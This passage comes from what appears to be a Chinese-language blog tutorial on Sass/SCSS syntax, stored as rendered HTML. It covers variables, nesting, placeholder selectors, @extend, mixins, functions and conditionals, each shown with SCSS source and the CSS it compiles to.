<code>.scss</code>，与 <code>css</code> 语法完全兼容</li>\n<li>不推荐使用 <code>.sass</code> 要求更严格，不能使用 <code>&#123;&#125;</code> 和 <code>;</code></li>\n</ul>\n<h3 id=\"2-2-文件导入\"><a href=\"#2-2-文件导入\" class=\"headerlink\" title=\"2.2 文件导入\"></a>2.2 文件导入</h3><ul>\n<li>可在 <code>Sass</code> 文件中导入 <code>Sass</code> 文件或 <code>css</code> 文件 （对于 <code>Sass</code> 文件可不写后缀名）</li>\n<li>基础文件以 _ 开头，如变量声明、混入等，（导入时可不写下划线）</li>\n</ul>\n<blockquote>\n<p>示例：</p>\n<ul>\n<li><code>@import &quot;page/page1&quot;</code></li>\n<li><code>@import &quot;lib/bootstrap.css&quot;</code></li>\n</ul>\n</blockquote>\n<h3 id=\"2-3-变量\"><a href=\"#2-3-变量\" class=\"headerlink\" title=\"2.3 变量\"></a>2.3 变量</h3><ul>\n<li>使用 <code>$</code> 声明并使用变量</li>\n<li>变量可被覆盖（就近原则或在变量后面添加 <code>!default</code>）</li>\n<li>变量可为全局或局部 （在选择器外部声明、选择器内部声明）</li>\n<li>当变量为字符串时，可在类名、属性名中引用，如 <code>border-#&#123;$variableName&#125;</code></li>\n<li>变量为 list 结构 （在 <code>$size: 18px 30px 34px</code> 使用 <code>nth($size, 1)</code> 调用）</li>\n<li>变量为 map 结构（使用 <code>@each $key, $value in $map</code> 调用）</li>\n</ul>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$gray</span>: <span class=\"number\">#666</span> !default;</span><br><span class=\"line\"><span class=\"variable\">$directory</span>: top;</span><br><span class=\"line\"><span class=\"variable\">$size</span>: <span class=\"number\">18px</span> <span class=\"number\">30px</span> <span class=\"number\">34px</span>;</span><br><span class=\"line\"><span class=\"variable\">$heading</span>: (h1: <span class=\"number\">#0aa</span>, h2: <span class=\"number\">#cc0</span>, h3: <span class=\"number\">#b0b</span>);</span><br><span class=\"line\"><span class=\"selector-tag\">body</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#f00</span>;</span><br><span class=\"line\">    <span class=\"selector-tag\">a</span> &#123;</span><br><span class=\"line\">        <span class=\"attribute\">font-size</span>: nth(<span class=\"variable\">$size</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"attribute\">color</span>: <span class=\"variable\">$gray</span>;</span><br><span class=\"line\">        <span class=\"attribute\">border</span>-#&#123;<span class=\"variable\">$directory</span>&#125;: <span class=\"number\">1</span> px solid <span class=\"variable\">$gray</span>;</span><br><span class=\"line\">        &amp;<span class=\"selector-pseudo\">:hover</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$font-size</span>: <span class=\"number\">40</span> px;</span><br><span class=\"line\">            <span class=\"attribute\">font-size</span>: <span class=\"variable\">$font-size</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">@each</span> <span class=\"variable\">$head</span>, <span class=\"variable\">$color</span> in <span class=\"variable\">$heading</span> &#123;</span><br><span class=\"line\">        #&#123;<span class=\"variable\">$head</span>&#125; &#123;</span><br><span class=\"line\">            <span class=\"attribute\">color</span>: <span class=\"variable\">$color</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-4-嵌套\"><a href=\"#2-4-嵌套\" class=\"headerlink\" title=\"2.4 嵌套\"></a>2.4 嵌套</h3><ul>\n<li>可使用选择器嵌套、属性嵌套 （属性嵌套并没什么用）</li>\n<li><code>@at-root</code> 可跳出所有的上级选择器 （可同时对过个选择器操作）</li>\n<li><code>#&#123;&amp;&#125;__modifer</code> 可实现 BEM 特性</li>\n</ul>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译前的 scss 文件</span></span><br><span class=\"line\"><span class=\"selector-class\">.footer</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">16px</span>;</span><br><span class=\"line\">    <span class=\"keyword\">@at-root</span> #&#123;&amp;&#125;__modifer &#123;</span><br><span class=\"line\">        <span class=\"attribute\">color</span>: <span class=\"number\">#333</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @at-root .nav &amp; &#123;</span><br><span class=\"line\">        color: <span class=\"number\">#f0f</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">@at-root</span> &#123;</span><br><span class=\"line\">        <span class=\"selector-class\">.child1</span> &#123;</span><br><span class=\"line\">            <span class=\"attribute\">color</span>: <span class=\"number\">#f00</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"selector-class\">.child2</span> &#123;</span><br><span class=\"line\">            <span class=\"attribute\">color</span>: <span class=\"number\">#ff0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译后的 css 文件</span></span><br><span class=\"line\"><span class=\"selector-class\">.footer</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">16px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.footer__modifer</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.nav</span> <span class=\"selector-class\">.footer</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#f0f</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.child1</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#f00</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.child2</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#ff0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-4-占位选择器\"><a href=\"#2-4-占位选择器\" class=\"headerlink\" title=\"2.4 占位选择器\"></a>2.4 占位选择器</h3><ul>\n<li>使用 <code>%</code> 声明占位选择器， 通过 <code>@extend</code> 调用占位选择器</li>\n<li>当占位选择器没被调用时，不会被解析出来 （推荐使用）</li>\n<li>占位选择器可以用其定义一些基础的样式文件</li>\n</ul>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译前的 scss 文件</span></span><br><span class=\"line\">% my-sty &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#aaa</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">10px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.child-1</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">@extend</span> %my-sty;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译后的 css 文件</span></span><br><span class=\"line\"><span class=\"selector-class\">.child1</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#aaa</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">10px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-5-继承\"><a href=\"#2-5-继承\" class=\"headerlink\" title=\"2.5 继承\"></a>2.5 继承</h3><p>说明：继承是建立在语义化的关系上。当一个元素拥有的类（如 <code>.seriousError</code> ）表明它属于另一个类（如 <code>.error</code>），此时适合用继承</p>\n<ul>\n<li>使用 <code>%extend</code> 进行继承</li>\n<li>可以继承任何定义给单个元素的选择器，比如 <code>.special.cool</code>、<code>a:hover</code></li>\n</ul>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译前</span></span><br><span class=\"line\"><span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:hover</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">text-decoration</span>: underline;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.hoverlink</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">@extend</span> <span class=\"attribute\">a</span>: <span class=\"attribute\">hover</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译后</span></span><br><span class=\"line\"><span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:hover</span>, <span class=\"selector-class\">.hoverlink</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">text-decoration</span>: underline;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译前</span></span><br><span class=\"line\"><span class=\"selector-class\">.error</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> <span class=\"number\">#f00</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"number\">#fdd</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">@extend</span> .error;</span><br><span class=\"line\">    <span class=\"attribute\">border-width</span>: <span class=\"number\">3px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译后</span></span><br><span class=\"line\"><span class=\"selector-class\">.error</span>, <span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> <span class=\"number\">#f00</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"number\">#fdd</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">border-width</span>: <span class=\"number\">3px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译前</span></span><br><span class=\"line\"><span class=\"selector-class\">.error</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> <span class=\"number\">#f00</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"number\">#fdd</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.error</span><span class=\"selector-class\">.intrusion</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">background-image</span>: url(<span class=\"string\">&quot;/image/hacked.png&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">@extend</span> .error;</span><br><span class=\"line\">    <span class=\"attribute\">border-width</span>: <span class=\"number\">3px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译后</span></span><br><span class=\"line\"><span class=\"selector-class\">.error</span>, <span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> <span class=\"number\">#f00</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"number\">#fdd</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.error</span><span class=\"selector-class\">.intrusion</span>, <span class=\"selector-class\">.intrusion</span><span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">background-image</span>: url(<span class=\"string\">&quot;/image/hacked.png&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">border-width</span>: <span class=\"number\">3px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-6-混合\"><a href=\"#2-6-混合\" class=\"headerlink\" title=\"2.6 混合\"></a>2.6 混合</h3><p>说明：混合指令用于定义可重复的样式，避免使用无语义的 <code>class</code>，如 <code>.clearfix</code>、<code>.float-left</code></p>\n<ul>\n<li>使用 <code>@mixin</code> 声明混合指令，通过<code> @include</code> 调用混合指令</li>\n<li>当混合没被调用时，不会被解析出来 （推荐使用）</li>\n<li>混合样式中也可以嵌套其他混合样式</li>\n<li>当混合为无参时，推荐使用占位选择器来实现</li>\n</ul>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译前的 scss 文件</span></span><br><span class=\"line\"><span class=\"keyword\">@mixin</span> ellipsis (<span class=\"variable\">$width</span>: <span class=\"number\">100px</span>) &#123;</span><br><span class=\"line\">    <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">    <span class=\"attribute\">white-space</span>: nowrap;</span><br><span class=\"line\">    <span class=\"attribute\">text-overflow</span>: ellipsis;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"variable\">$width</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.text-ellipsis</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#0ff</span>;</span><br><span class=\"line\">    <span class=\"keyword\">@include</span> ellipsis;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.text2-ellipsis</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#999</span>;</span><br><span class=\"line\">    <span class=\"keyword\">@include</span> ellipsis(<span class=\"variable\">$width</span>: <span class=\"number\">300px</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译后的 css 文件</span></span><br><span class=\"line\"><span class=\"selector-class\">.text-ellipsis</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#0ff</span>;</span><br><span class=\"line\">    <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">    <span class=\"attribute\">white-space</span>: nowrap;</span><br><span class=\"line\">    <span class=\"attribute\">text-overflow</span>: ellipsis;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.text2-ellipsis</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#999</span>;</span><br><span class=\"line\">    <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">    <span class=\"attribute\">white-space</span>: nowrap;</span><br><span class=\"line\">    <span class=\"attribute\">text-overflow</span>: ellipsis;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">300px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译前</span></span><br><span class=\"line\"><span class=\"keyword\">@mixin</span> height-light &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background</span>: <span class=\"number\">#fc0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@mixin</span> head-text &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">24px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@mixin</span> computed &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">@include</span> height-light;</span><br><span class=\"line\">\t<span class=\"keyword\">@include</span> head-text;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">span</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">@include</span> computed</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译后</span></span><br><span class=\"line\"><span class=\"selector-tag\">span</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"number\">#fc0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">24px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-7-函数\"><a href=\"#2-7-函数\" class=\"headerlink\" title=\"2.7 函数\"></a>2.7 函数</h3><ul>\n<li>使用 <code>@fuction funName (param) &#123;&#125;</code> 声明，通过 <code>funName()</code> 调用</li>\n<li>可使用 <code>sass</code> 自带的函数，如 <code>lighten()</code>、<code>darken()</code> 等</li>\n</ul>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译前的 scss 文件</span></span><br><span class=\"line\"><span class=\"keyword\">@function</span> addSize (<span class=\"variable\">$size</span>) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$baseSize</span>: <span class=\"number\">12px</span>;</span><br><span class=\"line\">    <span class=\"keyword\">@return</span> <span class=\"variable\">$baseSize</span>+<span class=\"variable\">$size</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.link-1</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$blue</span>: <span class=\"number\">#00A3CF</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: addSize(<span class=\"number\">10px</span>);</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: darken(<span class=\"variable\">$blue</span>, <span class=\"number\">25%</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.link-2</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$blue</span>: <span class=\"number\">#00A3CF</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: addSize(<span class=\"number\">10px</span>);</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: lighten(<span class=\"variable\">$blue</span>, <span class=\"number\">20%</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译后的 css 文件</span></span><br><span class=\"line\"><span class=\"selector-class\">.link-1</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">22px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#003f50</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.link-2</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">22px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#36d4ff</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-8-其他\"><a href=\"#2-8-其他\" class=\"headerlink\" title=\"2.8 其他\"></a>2.8 其他</h3><ul>\n<li>运算 可对遍历、数值、像素、颜色等进行四则运算（操作符前后需要空格）</li>\n<li>三目运算 条件为真/假时，返回不同的值 （与函数有点类似）</li>\n<li><code>@if</code> 条件成立后执行 <code>&#123;&#125;</code> 内的语句</li>\n<li><code>@each</code> 遍历 <code>list</code> 变量、<code>map</code> 变量</li>\n<li><code>@for</code> 在指定数值范围内遍历</li>\n</ul>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// sass 运算、 @if、三目运算 示例</span></span><br><span class=\"line\"><span class=\"comment\">// 编译前的 scss 文件</span></span><br><span class=\"line\"><span class=\"variable\">$hasSubMenu</span>: true;</span><br><span class=\"line\"><span class=\"variable\">$level</span>: <span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"selector-class\">.wrapper</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: if(<span class=\"variable\">$hasSubMenu</span>, <span class=\"number\">#f00</span>, <span class=\"number\">#00f</span>);</span><br><span class=\"line\">    <span class=\"keyword\">@if</span> <span class=\"variable\">$hasSubMenu</span> &#123;</span><br><span class=\"line\">        <span class=\"attribute\">background-image</span>: url(<span class=\"string\">&#x27;/images/down-icon.jpg&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">@if</span> <span class=\"variable\">$level</span>==<span class=\"number\">2</span> &#123;</span><br><span class=\"line\">        <span class=\"attribute\">height</span>: <span class=\"number\">60px</span> * <span class=\"number\">2</span>;</span><br><span class=\"line\">        <span class=\"attribute\">background</span>: <span class=\"number\">#f0f</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">@else</span> if <span class=\"variable\">$level</span>==<span class=\"number\">3</span> &#123;</span><br><span class=\"line\">        <span class=\"attribute\">height</span>: <span class=\"number\">60px</span> * <span class=\"number\">3</span>;</span><br><span class=\"line\">        <span class=\"attribute\">background</span>: <span class=\"number\">#f00</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 编译后的 css 文件</span></span><br><span class=\"line\"><span class=\"selector-class\">.wrapper</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">background-image</span>: url(<span 